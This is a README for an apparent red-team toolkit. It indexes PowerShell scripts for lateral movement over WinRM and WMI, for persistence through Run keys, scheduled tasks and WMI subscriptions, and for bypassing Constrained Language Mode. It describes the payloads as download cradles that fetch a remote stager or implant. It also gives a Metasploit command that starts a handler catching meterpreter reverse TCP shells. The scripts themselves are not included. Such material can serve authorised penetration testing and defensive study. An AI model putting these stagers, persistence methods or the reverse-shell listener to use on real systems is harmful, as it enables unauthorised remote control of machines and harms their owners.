# Lateral Movement, Persistence & CLM Bypass

| File | Purpose |
|---|---|
| `winrm-psremoting.ps1` | WinRM/PSRemoting lateral movement — run a PowerShell stager on a remote host |
| `wmi-exec.ps1` | WMI lateral movement — spawn a remote process via `Win32_Process` |
| `persistence.ps1` | Persistence — registry Run key, scheduled task, WMI event subscription |
| `clm-bypass.md` | Constrained Language Mode (CLM) bypass techniques |

All payloads are PowerShell stager download cradles by default — edit the URL or
swap in your implant.

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
```
